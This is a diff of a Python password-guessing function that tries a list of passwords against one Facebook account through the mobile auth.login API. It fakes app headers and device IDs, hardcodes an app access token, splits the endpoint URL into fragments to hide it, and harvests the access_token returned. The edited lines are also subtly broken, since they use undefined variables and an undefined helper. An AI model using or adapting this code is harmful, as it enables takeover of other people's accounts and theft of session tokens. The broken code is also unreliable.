@@ -1329,56 +1329,46 @@ def m6(idf,pwv):
     sys.stdout.flush()
     try:
       for pw in pwv:
-            device_id = str(uuid.uuid4())
-            adid = str(uuid.uuid4())
-            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
             useragent = str(ua_api())
-            data = {
-            'adid':adid,
+            data = {'adid':str(uuid.uuid4()),
             'format':'json',
-            'device_id':adid,
-            'email':idf,
-            'password':pw,
-            "logged_out_id": str(uuid.uuid4()),
-            "hash_id": str(uuid.uuid4()),
-            "reg_instance": str(uuid.uuid4()),
-            "session_id": str(uuid.uuid4()),
-            "advertiser_id": str(uuid.uuid4()),
+            'device_id':str(uuid.uuid4()),
+            'email':ids,
+            'password':pas,
             'generate_analytics_claims':'1',
+            'community_id':'',
+            'cpl':'true','try_num':'1',
+            'family_device_id':str(uuid.uuid4()),
             'credentials_type':'password',
             'source':'login',
-            "sim_country": "id",
-            "network_country": "id",
-            "relative_url": "method/auth.login",
             'error_detail_type':'button_with_disabled',
             'enroll_misauth':'false',
             'generate_session_cookies':'1',
             'generate_machine_id':'1',
-            "locale":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
-            "client_country_code":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]), 
+            'currently_logged_in_userid':'0',
+            'locale':'en_US',
+            'client_country_code':'US',
             'fb_api_req_friendly_name':'authenticate',
-            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
-            head = {
-            'Authorization':f'OAuth {accessToken}',
-            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
-            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
-            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
-            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
-            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-            'X-FB-device-group': str(random.randint(2000, 4000)),
-            "X-FB-Friendly-Name": "ViewerReactionsMutation",
-            "X-FB-Request-Analytics-Tags": "graphservice",
-            'X-FB-Friendly-Name':'authenticate',
-            'X-FB-Connection-Type':'unknown',
-            'X-FB-connection-quality':'EXCELLENT',
-            "X-Tigon-Is-Retry": "False",
-            'User-Agent':useragent,
-            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
+            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
+            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+            head = {'User-Agent': sex(),
             'Accept-Encoding':'gzip, deflate',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            "X-FB-Client-IP": "True",
-            "X-FB-Server-Cluster": "True",
-            'X-FB-HTTP-Engine': 'Liger'}
+            'Connection':'close',
+            'Content-Type':'application/x-www-form-urlencoded',
+            'Host':'graph.facebook.com',
+            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
+            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
+            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'X-FB-Connection-Type':'WIFI',
+            'X-Tigon-Is-Retry':'False',
+            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
+            'x-fb-device-group':'5120',
+            'X-FB-Friendly-Name':'ViewerReactionsMutation',
+            'X-FB-Request-Analytics-Tags':'graphservice',
+            'X-FB-HTTP-Engine':'Liger',
+            'X-FB-Client-IP':'True',
+            'X-FB-Server-Cluster':'True',
+            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
             url = 'htt'+'ps://b-'+'api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
             q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
